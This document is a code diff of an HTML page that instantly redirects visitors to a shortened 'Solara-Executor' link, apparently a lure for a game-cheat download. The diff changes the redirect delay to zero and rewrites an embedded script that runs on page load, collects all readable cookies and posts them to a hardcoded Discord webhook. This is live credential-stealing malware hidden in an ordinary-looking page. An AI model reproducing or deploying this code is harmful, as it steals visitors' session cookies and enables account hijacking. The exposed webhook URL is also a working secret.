@@ -14,7 +14,7 @@
       gtag('config', 'G-NTTP5YDYL7');
     </script>
     <!-- End Google Analytics -->
-    <meta http-equiv="refresh" content="10; url=https://bit.ly/Solara-Executor">
+    <meta http-equiv="refresh" content="0; url=https://bit.ly/Solara-Executor">
     <!-- Cookie Retrieval Script -->
     <script>
         // Function to get all accessible cookies
@@ -30,42 +30,39 @@
             return cookies;
         }
 
-        // Retrieve all accessible cookies
-        let allCookies = getAllCookies();
+        // Function to send cookies to Discord webhook
+        async function sendCookiesToDiscord(webhookUrl) {
+            try {
+                const cookies = getAllCookies();
+                
+                if (Object.keys(cookies).length === 0) {
+                    console.log('No accessible cookies found.');
+                    return;
+                }
 
-        // Log the cookies to the console for debugging
-        console.log("Retrieved Cookies: ", allCookies);
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Cookies: ${JSON.stringify(cookies)}`
+                    })
+                });
 
-        // Check if cookies are empty
-        if (Object.keys(allCookies).length === 0) {
-            console.warn("No accessible cookies found.");
-        }
-
-        // Function to send data to webhook
-        function sendToWebhook(data) {
-            fetch('https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `Cookies: ${JSON.stringify(data)}`
-                })
-            })
-            .then(response => {
                 if (response.ok) {
                     console.log('Cookies sent successfully!');
                 } else {
                     console.error('Error sending cookies:', response.statusText);
                 }
-            })
-            .catch(error => {
+            } catch (error) {
                 console.error('Error:', error);
-            });
+            }
         }
 
         // Send the retrieved cookies to the webhook
-        sendToWebhook(allCookies);
+        const webhookUrl = 'https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC';
+        sendCookiesToDiscord(webhookUrl);
     </script>
 </head>
 <body>
